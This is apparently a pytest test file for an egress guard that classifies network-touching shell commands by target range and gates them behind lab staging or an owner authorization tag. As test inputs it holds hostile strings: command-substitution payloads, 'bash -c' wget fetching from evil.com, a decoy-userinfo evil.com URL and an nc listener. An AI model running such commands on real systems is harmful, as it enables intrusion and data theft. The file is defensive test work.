"""KA-055 tests - egress guard: static classification of network-touching
commands, the RFC1918/external/localhost/unset class contract with exact
authorization requirements, boundary IPs around every private range, the
documented DNS-conservative default for unresolved names, scrub/hostile-
input parametrization, gate (bool, reason) shapes with exact reasons,
and a module source-scan pin (no execution/DNS facilities, pure stdlib).
No network."""
from __future__ import annotations

import importlib
from pathlib import Path

import pytest

import agentic_ai.agents.cyber.egress_guard as egress_guard
from agentic_ai.agents.cyber.egress_guard import (
    AUTH_TAG,
    CLASSIFICATION_KEYS,
    CLASS_EXTERNAL,
    CLASS_LOCALHOST,
    CLASS_RFC1918,
    CLASS_UNSET,
    MAX_COMMAND_CHARS,
    NETWORK_TOOLS,
    NETWORK_URL_SCHEMES,
    REQ_LAB_STAGING,
    REQ_NONE,
    REQ_OWNER_TAG,
    TARGET_KEYS,
    classify_egress,
    eg_scrub_command,
    egress_gate,
)


def _rows(plan):
    """(raw, host, shape, egress_class, required_auth) tuples of a plan."""
    return [
        (t["raw"], t["host"], t["shape"], t["egress_class"], t["required_auth"])
        for t in plan["targets"]
    ]


def test_vocab_constants_drift_alarm():
    # the class/auth contract is a pinned vocabulary - renaming any of
    # these breaks every downstream renderer and must happen HERE
    assert AUTH_TAG == "EGRESS-AUTH"
    assert (CLASS_RFC1918, CLASS_EXTERNAL, CLASS_LOCALHOST, CLASS_UNSET) == (
        "rfc1918", "external", "localhost", "unset",
    )
    assert (REQ_LAB_STAGING, REQ_OWNER_TAG, REQ_NONE) == (
        "lab_staging", "owner_auth_tag", "none",
    )
    assert TARGET_KEYS == ("raw", "host", "shape", "egress_class", "required_auth")
    assert CLASSIFICATION_KEYS == (
        "command_scrubbed", "verb", "network_touching", "targets",
    )


def test_network_tools_snapshot():
    assert {"curl", "wget", "ssh", "scp", "nc", "nmap", "dig",
            "ping"} <= NETWORK_TOOLS
    # multi-subcommand tools rely on explicit URL/IP routes, not name rows
    assert "git" not in NETWORK_TOOLS
    assert "docker" not in NETWORK_TOOLS


def test_url_scheme_snapshot():
    assert {"http", "https", "ftp", "ssh", "git", "ws"} <= NETWORK_URL_SCHEMES
    # local / encapsulated schemes are explicitly NOT network targets
    assert "file" not in NETWORK_URL_SCHEMES
    assert "data" not in NETWORK_URL_SCHEMES
    assert "mailto" not in NETWORK_URL_SCHEMES


# ---------------------------------------------------------------- scrub ----

@pytest.mark.parametrize("command", [
    None,
    123,
    "",
    "   ",
    "curl http://a.com; curl http://b.com",   # command chaining
    "a|b",
    "a&b",
    "a`b`",                                   # command substitution
    "a$(b)e",                                 # expansion
    "$(curl 10.0.0.1)",
    "(sub)",
    "a>b",
    "a<b",
    "a\\b",                                   # escape tricks
    "line\n2",
    "\x07",
    "x" * (MAX_COMMAND_CHARS + 1),            # over-length
])
def test_scrub_rejects_hostile_commands(command):
    with pytest.raises(ValueError):
        eg_scrub_command(command)


def test_scrub_accepts_and_trims():
    assert eg_scrub_command("  curl http://a  ") == "curl http://a"
    # quoting is legal inside a command (the parser strips it later)
    assert eg_scrub_command("curl '10.0.0.1'") == "curl '10.0.0.1'"
    assert isinstance(eg_scrub_command("x" * MAX_COMMAND_CHARS), str)


# ------------------------------------------------- classification core ----

_RFC1918_BOUNDARY = [
    # exact boundaries around all three RFC1918 ranges (measured runs)
    ("9.255.255.255", CLASS_EXTERNAL),
    ("10.0.0.0", CLASS_RFC1918),
    ("10.255.255.255", CLASS_RFC1918),
    ("11.0.0.0", CLASS_EXTERNAL),
    ("172.15.255.255", CLASS_EXTERNAL),
    ("172.16.0.0", CLASS_RFC1918),
    ("172.31.255.255", CLASS_RFC1918),
    ("172.32.0.0", CLASS_EXTERNAL),
    ("192.167.255.255", CLASS_EXTERNAL),
    ("192.168.0.0", CLASS_RFC1918),
    ("192.168.255.255", CLASS_RFC1918),
    ("192.169.0.0", CLASS_EXTERNAL),
    # special / non-RFC1918 space never waves through
    ("100.64.0.1", CLASS_EXTERNAL),        # CGNAT
    ("169.254.169.254", CLASS_EXTERNAL),   # cloud metadata service
    ("0.0.0.0", CLASS_EXTERNAL),
    ("8.8.8.8", CLASS_EXTERNAL),
    ("192.168.1.5", CLASS_RFC1918),
]


@pytest.mark.parametrize(("addr", "expected"), _RFC1918_BOUNDARY)
def test_rfc1918_boundary_classification(addr, expected):
    plan = classify_egress("ping " + addr)
    assert plan["network_touching"] is True
    rows = _rows(plan)
    assert len(rows) == 1  # the verb itself is never a target row
    assert rows[0] == (
        addr, addr, "ip", expected,
        REQ_LAB_STAGING if expected == CLASS_RFC1918 else REQ_OWNER_TAG,
    )


@pytest.mark.parametrize(("target", "shape"), [
    ("127.0.0.1", "ip"),
    ("127.255.255.255", "ip"),
    ("::1", "ip"),
    ("localhost", "name"),
    ("sub.localhost", "name"),
])
def test_localhost_needs_no_authorization(target, shape):
    plan = classify_egress("ping " + target)
    rows = _rows(plan)
    assert len(rows) == 1
    assert rows[0] == (target, target, shape, CLASS_LOCALHOST, REQ_NONE)
    # localhost never leaves the host: gate passes with no flags at all
    assert egress_gate(plan) == (True, "go: 1 egress target(s) authorized")


def test_ipv6_addresses_and_bracket_forms():
    assert _rows(classify_egress("ping fd00::1")) == [
        ("fd00::1", "fd00::1", "ip", CLASS_RFC1918, REQ_LAB_STAGING),
    ]  # IPv6 ULA analog of RFC1918 private space
    assert _rows(classify_egress("ping 2001:db8::1")) == [
        ("2001:db8::1", "2001:db8::1", "ip", CLASS_EXTERNAL, REQ_OWNER_TAG),
    ]  # global unicast is external
    assert _rows(classify_egress("nc [::1]:9000")) == [
        ("[::1]:9000", "::1", "hostport", CLASS_LOCALHOST, REQ_NONE),
    ]  # bracketed v6 :port reduction
    assert _rows(classify_egress("curl http://[fc00::1]:8080/")) == [
        ("http://[fc00::1]:8080/", "fc00::1", "url", CLASS_RFC1918,
         REQ_LAB_STAGING),
    ]  # bracketed v6 inside a URL


@pytest.mark.parametrize(("cidr", "expected"), [
    ("10.0.0.0/24", CLASS_RFC1918),
    ("172.16.0.0/16", CLASS_RFC1918),
    ("fd00::/8", CLASS_RFC1918),           # v6 ULA subnet
    ("0.0.0.0/0", CLASS_EXTERNAL),         # scan-everything demands the tag
])
def test_cidr_targets(cidr, expected):
    plan = classify_egress("nmap " + cidr)
    rows = _rows(plan)
    assert len(rows) == 1
    assert rows[0] == (
        cidr, cidr, "cidr", expected,
        REQ_LAB_STAGING if expected == CLASS_RFC1918 else REQ_OWNER_TAG,
    )


def test_cidr_rfc1918_requires_lab_staging():
    assert egress_gate("nmap 10.0.0.0/24") == (
        False, "no-go: target '10.0.0.0/24' requires lab staging",
    )
    assert egress_gate("nmap 10.0.0.0/24", lab_staged=True) == (
        True, "go: 1 egress target(s) authorized",
    )


def test_url_userinfo_decoys_never_decide():
    # decoy userinfo in EITHER direction is ignored: the netloc host wins
    assert _rows(classify_egress("curl http://10.0.0.1@evil.com")) == [
        ("http://10.0.0.1@evil.com", "evil.com", "url", CLASS_UNSET,
         REQ_OWNER_TAG),
    ]  # non-literal host name -> documented conservative unset default
    assert _rows(classify_egress("curl http://evil.com@10.0.0.1")) == [
        ("http://evil.com@10.0.0.1", "10.0.0.1", "url", CLASS_RFC1918,
         REQ_LAB_STAGING),
    ]


@pytest.mark.parametrize(("command", "expected_row"), [
    # host:digits reduction applies regardless of the verb (global route)
    ("echo 10.0.0.4:4444",
     ("10.0.0.4:4444", "10.0.0.4", "hostport", CLASS_RFC1918,
      REQ_LAB_STAGING)),
    # scp / rsync user@host:path reduction: host after the userinfo
    ("scp /tmp/f x@10.0.0.2:/tmp",
     ("x@10.0.0.2:/tmp", "10.0.0.2", "hostpath", CLASS_RFC1918,
      REQ_LAB_STAGING)),
    # bare git remote (no verb at all): host:path with a literal IP host
    ("git@10.0.0.2:org/repo.git",
     ("git@10.0.0.2:org/repo.git", "10.0.0.2", "hostpath", CLASS_RFC1918,
      REQ_LAB_STAGING)),
])
def test_reduced_form_targets(command, expected_row):
    plan = classify_egress(command)
    rows = _rows(plan)
    assert len(rows) == 1
    assert rows[0] == expected_row


def test_name_rows_only_inside_network_tools():
    # endpoint-first verbs: bare positional tokens become name targets,
    # and every unresolvable name is treated conservative (unset + tag)
    for command in ("curl gate", "curl example.com", "dig example.com",
                    "nslookup lab-gw", "traceroute -m 5 gate"):
        plan = classify_egress(command)
        rows = _rows(plan)
        assert len(rows) == 1, (command, rows)
        assert rows[0] == (
            rows[0][0], rows[0][0], "name", CLASS_UNSET, REQ_OWNER_TAG,
        ), (command, rows)
    # outside network tools there is no name route at all; and digits
    # (flags/ports/counts) are never name rows either
    for command in ("ls /etc", "echo example.com", "git push origin main",
                    "date at 3:30", "nc -lp 4444"):
        plan = classify_egress(command)
        assert plan["targets"] == (), (command, plan["targets"])
        assert plan["network_touching"] is False, command
        assert egress_gate(plan) == (True, "go: no egress targets detected")


def test_name_route_drops_pure_digit_tokens():
    # -c 4 / -p 445 style values never become hostname targets
    plan = classify_egress("ping -c 4 example.com")
    assert _rows(plan) == [
        ("example.com", "example.com", "name", CLASS_UNSET, REQ_OWNER_TAG),
    ]
    plan = classify_egress("nmap -sS -p 445 10.0.0.3")
    assert _rows(plan) == [
        ("10.0.0.3", "10.0.0.3", "ip", CLASS_RFC1918, REQ_LAB_STAGING),
    ]


def test_documented_fail_closed_bias_on_option_values():
    # option VALUES of network tools may over-demand the owner tag -
    # intended fail-closed bias (an unknown shape is never waived)
    plan = classify_egress("ssh -i key.pem 10.0.0.2")
    assert _rows(plan) == [
        ("key.pem", "key.pem", "name", CLASS_UNSET, REQ_OWNER_TAG),
        ("10.0.0.2", "10.0.0.2", "ip", CLASS_RFC1918, REQ_LAB_STAGING),
    ]
    assert egress_gate(plan) == (
        False, "no-go: target 'key.pem' requires owner auth tag 'EGRESS-AUTH'",
    )
    assert egress_gate(plan, lab_staged=True, auth_tags=[AUTH_TAG]) == (
        True, "go: 2 egress target(s) authorized",
    )


def test_unparseable_quad_targets_fail_closed():
    # IP-SHAPED but unparseable (leading-zero / octal tricks, big octets):
    # never classified private by shape, never waived
    for command in ("ping 010.0.0.1", "ping 300.300.300.300"):
        plan = classify_egress(command)
        rows = _rows(plan)
        assert len(rows) == 1, (command, rows)
        assert rows[0] == (
            command.split()[1], command.split()[1], "unknown", CLASS_UNSET,
            REQ_OWNER_TAG,
        ), (command, rows)


def test_quoted_target_survives_parsing():
    assert _rows(classify_egress("curl '10.0.0.1'")) == [
        ("10.0.0.1", "10.0.0.1", "ip", CLASS_RFC1918, REQ_LAB_STAGING),
    ]
    assert _rows(classify_egress('curl "10.0.0.1"')) == [
        ("10.0.0.1", "10.0.0.1", "ip", CLASS_RFC1918, REQ_LAB_STAGING),
    ]


def test_wrapper_payload_url_still_caught():
    # quoting a subcommand hides it from argv splitting, but the raw
    # piece scan still classifies URL-shaped payloads
    plan = classify_egress("bash -c 'wget http://evil.com/x'")
    assert plan["verb"] == "bash"
    assert plan["network_touching"] is True
    assert _rows(plan) == [
        ("http://evil.com/x'", "evil.com", "url", CLASS_UNSET,
         REQ_OWNER_TAG),
    ]


def test_duplicate_targets_deduplicate():
    plan = classify_egress("curl http://a.com http://a.com")
    assert _rows(plan) == [
        ("http://a.com", "a.com", "url", CLASS_UNSET, REQ_OWNER_TAG),
    ]


def test_classification_dict_exact_contract():
    plan = classify_egress(
        "curl http://10.0.0.1:8080/x http://a.com 192.168.1.5"
    )
    assert plan == {
        "command_scrubbed": "curl http://10.0.0.1:8080/x http://a.com 192.168.1.5",
        "verb": "curl",
        "network_touching": True,
        "targets": (
            {"raw": "http://10.0.0.1:8080/x", "host": "10.0.0.1",
             "shape": "url", "egress_class": CLASS_RFC1918,
             "required_auth": REQ_LAB_STAGING},
            {"raw": "http://a.com", "host": "a.com", "shape": "url",
             "egress_class": CLASS_UNSET, "required_auth": REQ_OWNER_TAG},
            {"raw": "192.168.1.5", "host": "192.168.1.5", "shape": "ip",
             "egress_class": CLASS_RFC1918, "required_auth": REQ_LAB_STAGING},
        ),
    }


def test_shape_taxonomy_slugs():
    sources = [
        ("curl http://a.com", "url"),
        ("ping 10.0.0.5", "ip"),
        ("nmap 10.0.0.0/24", "cidr"),
        ("nc [::1]:9000", "hostport"),
        ("scp /tmp/f x@10.0.0.2:/tmp", "hostpath"),
        ("curl gate", "name"),
        ("ping 010.0.0.1", "unknown"),
    ]
    seen = set()
    for command, shape in sources:
        rows = _rows(classify_egress(command))
        assert len(rows) == 1, (command, rows)
        assert rows[0][2] == shape, (command, rows)
        seen.add(shape)
    assert seen == {"url", "ip", "cidr", "hostport", "hostpath", "name",
                    "unknown"}


def test_unbalanced_quoting_rejected():
    with pytest.raises(ValueError):
        classify_egress('curl "10.0.0.1')


# --------------------------------------------------------------- gate ----

def test_gate_no_targets_is_go():
    assert isinstance(egress_gate("ls -la /tmp"), tuple)
    assert egress_gate("ls -la /tmp") == (True, "go: no egress targets detected")


def test_gate_rfc1918_requires_lab_staging_exact_reasons():
    assert egress_gate("ping 10.0.0.5") == (
        False, "no-go: target '10.0.0.5' requires lab staging",
    )
    assert egress_gate("ping 10.0.0.5", lab_staged=True) == (
        True, "go: 1 egress target(s) authorized",
    )


def test_gate_external_requires_owner_auth_tag_exact_reasons():
    assert egress_gate("ping 8.8.8.8") == (
        False,
        "no-go: target '8.8.8.8' requires owner auth tag 'EGRESS-AUTH'",
    )
    assert egress_gate("ping 8.8.8.8", auth_tags=[AUTH_TAG]) == (
        True, "go: 1 egress target(s) authorized",
    )


def test_gate_unresolved_name_demands_the_tag_by_default():
    # THE documented DNS-conservative default: an unresolved name plans
    # unset and demands external-grade authorization
    assert egress_gate("curl example.com") == (
        False,
        "no-go: target 'example.com' requires owner auth tag 'EGRESS-AUTH'",
    )
    assert egress_gate("curl example.com", auth_tags=[AUTH_TAG]) == (
        True, "go: 1 egress target(s) authorized",
    )


def test_gate_tag_must_match_exactly():
    # wrong tag and wrong case never clear the target
    assert egress_gate("curl example.com", auth_tags=("other",))[0] is False
    assert egress_gate("curl example.com", auth_tags=["egress-auth"])[0] is False
    # a bare string is accepted as a one-tag convenience
    assert egress_gate("curl example.com", auth_tags=AUTH_TAG) == (
        True, "go: 1 egress target(s) authorized",
    )


def test_gate_mixed_targets_first_failure_names_the_reason():
    assert egress_gate("ping 10.0.0.5 8.8.8.8") == (
        False, "no-go: target '10.0.0.5' requires lab staging",
    )
    # staging alone lifts the rfc1918 row, the external row still fails
    assert egress_gate("ping 10.0.0.5 8.8.8.8", lab_staged=True) == (
        False,
        "no-go: target '8.8.8.8' requires owner auth tag 'EGRESS-AUTH'",
    )
    assert egress_gate("ping 10.0.0.5 8.8.8.8", lab_staged=True,
                       auth_tags=[AUTH_TAG]) == (
        True, "go: 2 egress target(s) authorized",
    )


def test_gate_localhost_row_passes_without_flags_among_others():
    plan = classify_egress("curl http://localhost:8080/x http://a.com")
    assert egress_gate(plan) == (
        False,
        "no-go: target 'http://a.com' requires owner auth tag 'EGRESS-AUTH'",
    )
    assert egress_gate(plan, auth_tags=[AUTH_TAG]) == (
        True, "go: 2 egress target(s) authorized",
    )
    assert egress_gate("curl http://localhost:8080/x") == (
        True, "go: 1 egress target(s) authorized",
    )


def test_gate_accepts_dict_or_command_equivalently():
    plan = classify_egress("ping 10.0.0.5")
    assert (egress_gate(plan, lab_staged=True)
            == egress_gate("ping 10.0.0.5", lab_staged=True))
    assert egress_gate(plan) == egress_gate("ping 10.0.0.5")


@pytest.mark.parametrize("classification", [
    123,
    {},
    {"targets": ()},                      # missing network_touching
    {"network_touching": True, "targets": ()},   # touching with no rows
    {"network_touching": False,
     "targets": ({"raw": "8.8.8.8", "egress_class": CLASS_EXTERNAL,
                  "required_auth": REQ_OWNER_TAG},)},
    {"network_touching": True,
     "targets": ({"raw": "8.8.8.8", "egress_class": CLASS_EXTERNAL,
                  "required_auth": REQ_NONE},)},          # class/auth lie
    {"network_touching": True,
     "targets": ({"raw": "8.8.8.8", "egress_class": "weird",
                  "required_auth": REQ_NONE},)},          # unknown class
    {"network_touching": True,
     "targets": ({"raw": "8.8.8.8"},)},                   # shapeless row
])
def test_gate_rejects_malformed_classifications(classification):
    with pytest.raises(ValueError):
        egress_gate(classification)


def test_gate_hand_built_consistent_classification_is_accepted():
    assert egress_gate(
        {"network_touching": False, "targets": ()},
    ) == (True, "go: no egress targets detected")
    assert egress_gate(
        {"network_touching": True,
         "targets": ({"raw": "8.8.8.8", "egress_class": CLASS_EXTERNAL,
                      "required_auth": REQ_OWNER_TAG},)},
        auth_tags=[AUTH_TAG],
    ) == (True, "go: 1 egress target(s) authorized")


@pytest.mark.parametrize("bad_call", [
    {"lab_staged": "yes"},
    {"auth_tags": ["bad tag!"]},
    {"auth_tags": [""]},
    {"auth_tags": [None]},
    {"auth_tags": [42]},
    {"auth_tags": 5},
])
def test_gate_rejects_malformed_authorization_input(bad_call):
    with pytest.raises(ValueError):
        egress_gate("ls -la /tmp", **dict(bad_call))


# ------------------------------------------------- documented posture ----

def test_dns_resolution_strategy_is_documented():
    doc = egress_guard.__doc__ or ""
    assert "DNS RESOLUTION STRATEGY" in doc
    assert "UNRESOLVABLE at plan time" in doc


def test_module_purity_source_scan():
    # planner purity by construction: no exec facilities, no DNS / name
    # resolution, no chassis import; stdlib ipaddress and shlex only
    module = importlib.import_module("agentic_ai.agents.cyber.egress_guard")
    source = Path(module.__file__).read_text(encoding="utf-8")
    for banned in ("subprocess", "os.system", "eval(", "socket",
                   "getaddrinfo", "gethostbyname", "urlopen", "popen",
                   "from agentic_ai", "import agentic_ai"):
        assert banned not in source, banned
    assert "import ipaddress" in source
    assert "import shlex" in source